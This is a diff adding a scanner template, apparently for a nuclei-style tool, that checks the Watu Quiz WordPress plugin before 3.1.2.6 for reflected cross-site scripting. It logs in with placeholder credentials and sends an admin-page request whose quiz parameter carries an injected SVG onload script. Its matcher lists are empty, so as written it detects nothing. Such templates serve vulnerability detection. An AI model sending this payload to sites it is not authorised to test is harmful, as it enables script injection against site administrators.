@@ -1,0 +1,25 @@
+id: watu-xss
+brief:
+    title: Watu Quiz < 3.1.2.6 - Cross Site Scripting
+    by: r3Y3r53
+    level: medium
+    about: The Watu Quiz WordPress plugin was affected by a Reflected XSS via question-form.html.php security vulnerability.
+    label:
+        - watu
+        - quiz
+        - authenticated
+        - wpscan
+        - xss
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/wp-login.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: log={{username}}&pwd={{password}}&wp-submit=Log+In
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}wp-admin/admin.php?page=watu_question&question=1&action=edit&quiz=1"><svg/onload=alert(document.domain)>'
+      signs: []
